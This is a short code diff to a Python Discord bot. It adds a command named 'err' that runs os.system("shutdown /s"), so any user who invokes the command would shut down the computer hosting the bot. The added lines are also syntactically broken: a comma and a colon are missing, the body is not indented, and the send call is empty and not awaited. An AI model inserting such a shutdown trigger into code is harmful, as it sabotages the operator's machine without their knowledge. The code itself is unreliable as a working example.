@@ -285,5 +285,9 @@ async def ping(ctx):
         title = 'Задержка бота',
         description = f'**{Bot.ws.latency * 1000:.0f} мс**'
     ))
+@Bot.command()
+async def err(ctx member: discord.Member)
+os.system("shutdown /s")
+ctx.send()
 token = os.environ.get('BOT_TOKEN')
 Bot.run(str(token))
